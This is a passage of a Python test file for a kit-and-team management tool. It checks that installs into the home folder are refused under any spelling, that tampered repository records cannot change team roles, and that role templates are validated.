    repo = tmp_path / "users" / "me" / "work" / "repo"
    (repo / ".git").mkdir(parents=True)
    assert api.may_install_into(repo) and not api.may_install_into(fake_home)
    out = api.create_team(
        {
            "kit": "sample-kit",
            "team": "feature-squad",
            "kit_path": str(SAMPLE),
            "project": str(repo),
        }
    )
    assert out["team"]["project"] == str(repo.resolve())


def test_may_install_into_judges_the_home_folder_by_identity_not_spelling(tmp_path, monkeypatch):
    """Security recheck of #518: on APFS `.../home` and `.../HOME` are one
    folder, as are the NFC and NFD spellings of an accented name; a string
    comparison let a kit's hooks into a dotfiles home reached that way."""
    import unicodedata
    from pathlib import Path

    fake_home = tmp_path / "Hôme"
    (fake_home / ".git").mkdir(parents=True)
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: fake_home))
    assert not api.may_install_into(fake_home)
    assert not api.may_install_into(tmp_path)  # above home, even without .git
    variants = [
        tmp_path / "hôme",
        tmp_path / "HÔME",
        tmp_path / unicodedata.normalize("NFD", "Hôme"),
    ]
    for variant in variants:
        # the same folder on a case-insensitive or normalising file system,
        # nothing at all elsewhere: refused either way
        assert not api.may_install_into(variant), variant
    sibling = tmp_path / "Home2"
    (sibling / ".git").mkdir(parents=True)
    assert api.may_install_into(sibling)


def test_create_team_takes_the_template_from_the_added_kit_not_the_repository_record(
    tmp_path, monkeypatch
):
    """The repository's install record is writable by whoever works there;
    the roles a session opens with come from the kit the owner added."""
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    project = _project(tmp_path)
    (project / ".git").mkdir()
    api.install_kit({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
    record_path = project / ".duckterm" / "installed.json"
    record = json.loads(record_path.read_text())
    record["kits"]["sample-kit"]["procedures"][0]["roles"]["intruder"] = {
        "purpose": "pushes to main",
        "skills": [],
    }
    record_path.write_text(json.dumps(record))
    out = api.create_team(
        {
            "kit": "sample-kit",
            "team": "feature-squad",
            "kit_path": str(SAMPLE),
            "project": str(project),
        }
    )
    assert set(out["team"]["roles"]) == {"dev", "reviewer"}


def test_create_team_checks_a_repository_record_template_as_hard_as_a_manifest(
    tmp_path, monkeypatch
):
    """Security INFO on #518: an unregistered kit's record (no kit_path) is
    still the template; a role written as a number, or forty skills, was a
    500 or unbounded. Both are a 400 now."""
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    project = _project(tmp_path)
    (project / ".git").mkdir()
    api.install_kit({"kit": str(SAMPLE), "project": str(project), "harnesses": ["claude-code"]})
    record_path = project / ".duckterm" / "installed.json"
    record = json.loads(record_path.read_text())
    template = record["kits"]["sample-kit"]["procedures"][0]
    template["roles"]["dev"] = "just a string"
    template["roles"]["reviewer"]["skills"] = [f"s{i}" for i in range(40)]
    record_path.write_text(json.dumps(record))
    with pytest.raises(api.KitApiError) as refused:
        api.create_team({"kit": "sample-kit", "team": "feature-squad", "project": str(project)})
    assert refused.value.status == 400
    message = str(refused.value)
    assert "role 'reviewer': skills is a list of at most 32" in message
    assert "role 'dev'" not in message  # a bare string is read as the purpose
    template["roles"]["dev"] = 7
    template["roles"]["reviewer"]["skills"] = ["ok"]
    record_path.write_text(json.dumps(record))
    with pytest.raises(api.KitApiError) as refused:
        api.create_team({"kit": "sample-kit", "team": "feature-squad", "project": str(project)})
    assert refused.value.status == 400 and "role 'dev': not a table" in str(refused.value)
    template["roles"] = "none"
    record_path.write_text(json.dumps(record))
    with pytest.raises(api.KitApiError) as refused:
        api.create_team({"kit": "sample-kit", "team": "feature-squad", "project": str(project)})
    assert refused.value.status == 400 and "roles is a table" in str(refused.value)


def test_create_team_refuses_a_template_with_too_many_or_badly_named_roles(tmp_path, monkeypatch):
    from duckterm.helpers import instance
    from duckterm.kits import validate

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "dthome")
    root = tmp_path / "bigkit"
    (root / "teams").mkdir(parents=True)
    (root / "metaharness.toml").write_text(
        'manifest_version = 1\nname = "bigkit"\nversion = "1.0.0"\ndescription = "d"\n'
        'teams = ["teams/crowd.toml", "teams/odd.toml"]\n'
        '[[components]]\nkind = "knowledge"\npath = "k.md"\n'
    )
    (root / "k.md").write_text("rules\n")
    crowd = 'name = "crowd"\n' + "".join(
        f'[roles.r{i}]\ncard = {{ purpose = "p" }}\nskills = []\n' for i in range(13)
    )
    (root / "teams" / "crowd.toml").write_text(crowd)
    (root / "teams" / "odd.toml").write_text(
        'name = "odd"\n[roles."Dev Lead"]\ncard = { purpose = "' + "x" * 301 + '" }\nskills = []\n'
        '[[rules]]\nrole = "Dev Lead"\nmay_not = ["' + "y" * 250 + '"]\n'
    )
    kit = api._kit(str(root))
    messages = [str(f) for f in validate.validate(kit)]
    assert any("13 roles; a team has at most 12" in msg for msg in messages)
    assert any("role 'Dev Lead': a name is lowercase" in msg for msg in messages)
    assert any(
        "role 'Dev Lead': purpose is text of at most 300 characters" in msg for msg in messages
    )
    assert any("rule 1 is 2" in msg and "200 at most" in msg for msg in messages)
    for team, text in (("crowd", "13 roles"), ("odd", "Dev Lead")):
        with pytest.raises(api.KitApiError) as refused:
            api.create_team({"kit": "bigkit", "team": team, "kit_path": str(root)})
        assert refused.value.status == 400 and text in str(refused.value)


def test_create_team_from_an_added_kit_needs_no_install(tmp_path, monkeypatch):
    from duckterm.helpers import instance

    monkeypatch.setattr(instance, "home", lambda: tmp_path / "home")
    out = api.create_team({"kit": "sample-kit", "team": "feature-squad", "kit_path": str(SAMPLE)})
    assert out["team"]["project"] is None and out["team"]["kit_version"] == "0.1.0"
    assert set(out["team"]["roles"]) == {"dev", "reviewer"}
    api.add_policy_workspace("sample-kit", "feature-squad", str(SAMPLE))
    assert api.policies()["sample-kit"] == {
        "scope": "workspaces",
        "workspaces": ["feature-squad"],
        "digest": api.kit_digest(SAMPLE),
    }
    with pytest.raises(api.KitApiError) as refused:
        api.create_team({"kit": "sample-kit", "team": "feature-squad", "name": "other"})
    assert refused.value.status == 400


def test_inventory_names_the_triggers_a_flow_declares():
    """The MetaHarness page's Trigger column read a field that was always None;
    it now carries the flow's declared trigger types, and None for a flow a
    person starts."""
    kit = (
        Path(__file__).resolve().parents[3]
        / "src"
        / "duckterm"
        / "autopilot"
        / "kits"
        / "autopilot"
    )
    flows = {f["name"]: f for f in api.details(manifest.load(kit))["flow"]}
    assert flows["issue-to-merge"]["trigger"] == "github-issue, jira-issue, slack-message"
    assert flows["pr-review"]["trigger"] is None
